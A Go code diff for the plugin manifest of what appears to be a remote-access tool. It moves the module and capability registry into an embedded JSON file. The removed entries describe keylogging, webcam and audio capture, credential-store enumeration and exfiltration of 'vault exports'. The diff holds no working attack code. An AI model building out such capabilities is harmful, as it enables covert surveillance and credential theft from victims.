@@ -1,6 +1,8 @@
 package pluginmanifest
 
 import (
+	_ "embed"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"net/url"
@@ -41,6 +43,76 @@ type TelemetryMetadata struct {
 	Module      string
 	Name        string
 	Description string
+}
+
+type moduleCapabilityDescriptor struct {
+	ID          string `json:"id"`
+	Name        string `json:"name"`
+	Description string `json:"description"`
+}
+
+type moduleDefinition struct {
+	ID           string                       `json:"id"`
+	Capabilities []moduleCapabilityDescriptor `json:"capabilities"`
+	Telemetry    []moduleCapabilityDescriptor `json:"telemetry"`
+}
+
+type moduleDefinitionsPayload struct {
+	Modules []moduleDefinition `json:"modules"`
+}
+
+//go:embed definitions.json
+var moduleDefinitionsJSON []byte
+
+func init() {
+	var payload moduleDefinitionsPayload
+	if err := json.Unmarshal(moduleDefinitionsJSON, &payload); err != nil {
+		panic(fmt.Sprintf("parse module definitions: %v", err))
+	}
+
+	for _, module := range payload.Modules {
+		moduleID := strings.TrimSpace(module.ID)
+		if moduleID == "" {
+			continue
+		}
+		registeredModules[moduleID] = struct{}{}
+
+		for _, capability := range module.Capabilities {
+			capID := strings.TrimSpace(capability.ID)
+			if capID == "" {
+				continue
+			}
+			normalized := strings.ToLower(capID)
+			if prev, ok := normalizedCapabilities[normalized]; ok {
+				panic(fmt.Sprintf("duplicate capability id %q found in module %s (previously registered by %s)", capID, moduleID, prev))
+			}
+			registeredCapabilities[capID] = CapabilityMetadata{
+				ID:          capID,
+				Module:      moduleID,
+				Name:        strings.TrimSpace(capability.Name),
+				Description: strings.TrimSpace(capability.Description),
+			}
+			normalizedCapabilities[normalized] = moduleID
+		}
+
+		for _, telemetry := range module.Telemetry {
+			teleID := strings.TrimSpace(telemetry.ID)
+			if teleID == "" {
+				continue
+			}
+			normalized := strings.ToLower(teleID)
+			if prev, ok := normalizedTelemetry[normalized]; ok {
+				panic(fmt.Sprintf("duplicate telemetry id %q found in module %s (previously registered by %s)", teleID, moduleID, prev))
+			}
+			registeredTelemetry[teleID] = TelemetryMetadata{
+				ID:          teleID,
+				Module:      moduleID,
+				Name:        strings.TrimSpace(telemetry.Name),
+				Description: strings.TrimSpace(telemetry.Description),
+			}
+			normalizedTelemetry[normalized] = moduleID
+		}
+	}
 }
 
 type Requirements struct {
@@ -126,251 +198,19 @@ const (
 )
 
 var (
-	knownDeliveryModes  = []DeliveryMode{DeliveryManual, DeliveryAutomatic}
-	knownSignatureTypes = []SignatureType{SignatureSHA256, SignatureEd25519}
-	knownPlatforms      = []PluginPlatform{PlatformWindows, PlatformLinux, PlatformMacOS}
-	knownArchitectures  = []PluginArchitecture{ArchitectureX8664, ArchitectureARM64}
-	knownInstallStates  = []PluginInstallStatus{InstallBlocked, InstallDisabled, InstallError, InstallInstalled}
-	knownApprovalStates = []PluginApprovalStatus{ApprovalPending, ApprovalApproved, ApprovalRejected}
-	knownRuntimeTypes   = []RuntimeType{RuntimeNative, RuntimeWASM}
-	semverPattern       = regexp.MustCompile(`^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-[0-9A-Za-z-.]+)?(?:\+[0-9A-Za-z-.]+)?$`)
-        registeredModules   = map[string]struct{}{
-                "app-vnc":         {},
-                "remote-desktop":  {},
-                "webcam-control":  {},
-                "audio-control":   {},
-                "keylogger":       {},
-                "clipboard":       {},
-                "file-manager":    {},
-                "task-manager":    {},
-                "tcp-connections": {},
-                "recovery":        {},
-                "client-chat":     {},
-                "system-info":     {},
-                "notes":           {},
-                "registry":        {},
-                "startup-manager": {},
-        }
-	registeredCapabilities = map[string]CapabilityMetadata{
-		"app-vnc.launch": {
-			ID:          "app-vnc.launch",
-			Module:      "app-vnc",
-			Name:        "app-vnc.launch",
-			Description: "Clone per-application profiles and start virtualized sessions.",
-		},
-		"remote-desktop.stream": {
-			ID:          "remote-desktop.stream",
-			Module:      "remote-desktop",
-			Name:        "Desktop streaming",
-			Description: "Stream high-fidelity desktop frames to the controller UI.",
-		},
-		"remote-desktop.input": {
-			ID:          "remote-desktop.input",
-			Module:      "remote-desktop",
-			Name:        "Input relay",
-			Description: "Relay keyboard and pointer events back to the remote host.",
-		},
-		"remote-desktop.transport.quic": {
-			ID:          "remote-desktop.transport.quic",
-			Module:      "remote-desktop",
-			Name:        "QUIC transport",
-			Description: "Provide QUIC transport negotiation for resilient input streams.",
-		},
-		"remote-desktop.codec.hevc": {
-			ID:          "remote-desktop.codec.hevc",
-			Module:      "remote-desktop",
-			Name:        "HEVC encoding",
-			Description: "Enable hardware-accelerated HEVC streaming when supported.",
-		},
-		"remote-desktop.metrics": {
-			ID:          "remote-desktop.metrics",
-			Module:      "remote-desktop",
-			Name:        "Performance telemetry",
-			Description: "Collect frame quality and adaptive bitrate metrics for dashboards.",
-		},
-		"webcam.enumerate": {
-			ID:          "webcam.enumerate",
-			Module:      "webcam-control",
-			Name:        "webcam.enumerate",
-			Description: "Enumerate connected webcam devices and capabilities.",
-		},
-		"webcam.stream": {
-			ID:          "webcam.stream",
-			Module:      "webcam-control",
-			Name:        "webcam.stream",
-			Description: "Initiate webcam streaming sessions when supported.",
-		},
-		"audio.capture": {
-			ID:          "audio.capture",
-			Module:      "audio-control",
-			Name:        "Audio capture",
-			Description: "Capture remote system audio for monitoring and recording.",
-		},
-		"audio.inject": {
-			ID:          "audio.inject",
-			Module:      "audio-control",
-			Name:        "Audio injection",
-			Description: "Inject operator-provided audio streams into the remote session.",
-		},
-		"keylogger.stream": {
-			ID:          "keylogger.stream",
-			Module:      "keylogger",
-			Name:        "keylogger.stream",
-			Description: "Stream keystroke telemetry to the controller in near real time.",
-		},
-		"keylogger.batch": {
-			ID:          "keylogger.batch",
-			Module:      "keylogger",
-			Name:        "keylogger.batch",
-			Description: "Batch keystrokes offline and upload on a schedule.",
-		},
-		"clipboard.capture": {
-			ID:          "clipboard.capture",
-			Module:      "clipboard",
-			Name:        "Clipboard capture",
-			Description: "Capture clipboard changes emitted by the remote workstation.",
-		},
-		"clipboard.push": {
-			ID:          "clipboard.push",
-			Module:      "clipboard",
-			Name:        "Clipboard push",
-			Description: "Push operator clipboard payloads to the remote host.",
-		},
-		"file-manager.explore": {
-			ID:          "file-manager.explore",
-			Module:      "file-manager",
-			Name:        "file-manager.explore",
-			Description: "Enumerate directories and retrieve file contents from the host.",
-		},
-		"file-manager.modify": {
-			ID:          "file-manager.modify",
-			Module:      "file-manager",
-			Name:        "file-manager.modify",
-			Description: "Create, update, move, and delete files and directories on demand.",
-		},
-		"task-manager.list": {
-			ID:          "task-manager.list",
-			Module:      "task-manager",
-			Name:        "task-manager.list",
-			Description: "Collect real-time process snapshots with metadata.",
-		},
-		"task-manager.control": {
-			ID:          "task-manager.control",
-			Module:      "task-manager",
-			Name:        "task-manager.control",
-			Description: "Start and orchestrate process actions on demand.",
-		},
-		"tcp-connections.enumerate": {
-			ID:          "tcp-connections.enumerate",
-			Module:      "tcp-connections",
-			Name:        "tcp-connections.enumerate",
-			Description: "Collect real-time socket state with process attribution.",
-		},
-		"tcp-connections.control": {
-			ID:          "tcp-connections.control",
-			Module:      "tcp-connections",
-			Name:        "tcp-connections.control",
-			Description: "Stage enforcement actions for suspicious remote peers.",
-		},
-		"recovery.queue": {
-			ID:          "recovery.queue",
-			Module:      "recovery",
-			Name:        "Recovery queue",
-			Description: "Queue recovery jobs for background execution and monitoring.",
-		},
-		"recovery.collect": {
-			ID:          "recovery.collect",
-			Module:      "recovery",
-			Name:        "Artifact collection",
-			Description: "Collect artifacts staged by upstream modules for exfiltration.",
-		},
-		"vault.export": {
-			ID:          "vault.export",
-			Module:      "recovery",
-			Name:        "Vault export collection",
-			Description: "Stage and exfiltrate vault exports via the recovery pipeline.",
-		},
-		"client-chat.persistent": {
-			ID:          "client-chat.persistent",
-			Module:      "client-chat",
-			Name:        "Persistent window",
-			Description: "Keep the chat interface open continuously and respawn it if terminated.",
-		},
-		"client-chat.alias": {
-			ID:          "client-chat.alias",
-			Module:      "client-chat",
-			Name:        "Alias control",
-			Description: "Allow the controller to update operator and client aliases in real time.",
-		},
-		"system-info.snapshot": {
-			ID:          "system-info.snapshot",
-			Module:      "system-info",
-			Name:        "System snapshot",
-			Description: "Produce structured operating system and hardware inventories.",
-		},
-		"system-info.telemetry": {
-			ID:          "system-info.telemetry",
-			Module:      "system-info",
-			Name:        "System telemetry",
-			Description: "Surface live telemetry metrics used by scheduling and recovery modules.",
-		},
-		"vault.enumerate": {
-			ID:          "vault.enumerate",
-			Module:      "system-info",
-			Name:        "Vault enumeration",
-			Description: "Enumerate installed password managers and browser credential stores.",
-		},
-                "notes.sync": {
-                        ID:          "notes.sync",
-                        Module:      "notes",
-                        Name:        "Notes sync",
-                        Description: "Synchronize local incident notes to the operator vault with delta compression.",
-                },
-                "registry.inspect": {
-                        ID:          "registry.inspect",
-                        Module:      "registry",
-                        Name:        "registry.inspect",
-                        Description: "Enumerate registry hives, keys, and values on supported platforms.",
-                },
-                "registry.modify": {
-                        ID:          "registry.modify",
-                        Module:      "registry",
-                        Name:        "registry.modify",
-                        Description: "Create, edit, and delete registry keys and values on supported platforms.",
-                },
-                "startup.enumerate": {
-                        ID:          "startup.enumerate",
-                        Module:      "startup-manager",
-                        Name:        "startup.enumerate",
-                        Description: "Enumerate autorun entries and associated telemetry across supported operating systems.",
-                },
-                "startup.manage": {
-                        ID:          "startup.manage",
-                        Module:      "startup-manager",
-                        Name:        "startup.manage",
-                        Description: "Create, toggle, and remove autorun entries using native schedulers.",
-                },
-        }
-	registeredTelemetry = map[string]TelemetryMetadata{
-		"remote-desktop.metrics": {
-			ID:          "remote-desktop.metrics",
-			Module:      "remote-desktop",
-			Name:        "Performance telemetry",
-			Description: "Emit adaptive streaming metrics describing encoder performance and transport health.",
-		},
-		"audio.telemetry": {
-			ID:          "audio.telemetry",
-			Module:      "audio-control",
-			Name:        "Audio telemetry",
-			Description: "Report capture bridge levels, buffer health, and device availability to the controller.",
-		},
-		"system-info.telemetry": {
-			ID:          "system-info.telemetry",
-			Module:      "system-info",
-			Name:        "System telemetry",
-			Description: "Stream host performance counters, thermal states, and resource utilization snapshots.",
-		},
-	}
+	knownDeliveryModes     = []DeliveryMode{DeliveryManual, DeliveryAutomatic}
+	knownSignatureTypes    = []SignatureType{SignatureSHA256, SignatureEd25519}
+	knownPlatforms         = []PluginPlatform{PlatformWindows, PlatformLinux, PlatformMacOS}
+	knownArchitectures     = []PluginArchitecture{ArchitectureX8664, ArchitectureARM64}
+	knownInstallStates     = []PluginInstallStatus{InstallBlocked, InstallDisabled, InstallError, InstallInstalled}
+	knownApprovalStates    = []PluginApprovalStatus{ApprovalPending, ApprovalApproved, ApprovalRejected}
+	knownRuntimeTypes      = []RuntimeType{RuntimeNative, RuntimeWASM}
+	semverPattern          = regexp.MustCompile(`^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-[0-9A-Za-z-.]+)?(?:\+[0-9A-Za-z-.]+)?$`)
+	registeredModules      = map[string]struct{}{}
+	registeredCapabilities = map[string]CapabilityMetadata{}
+	registeredTelemetry    = map[string]TelemetryMetadata{}
+	normalizedCapabilities = map[string]string{}
+	normalizedTelemetry    = map[string]string{}
 )
 
 func LookupTelemetry(id string) (TelemetryMetadata, bool) {
